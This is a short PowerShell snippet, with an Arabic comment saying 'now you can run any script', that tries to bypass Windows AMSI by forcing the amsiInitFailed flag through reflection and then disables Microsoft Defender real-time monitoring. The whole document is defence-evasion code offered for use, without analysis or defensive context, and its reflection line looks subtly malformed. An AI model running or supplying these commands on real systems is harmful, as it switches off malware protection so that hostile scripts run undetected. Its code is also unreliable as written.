# AMSI Bypass
$s = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed'
If (-Not $s) {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed' = $true}

# الآن يمكنك تشغيل أي سكربت
Set-MpPreference -DisableRealtimeMonitoring $true
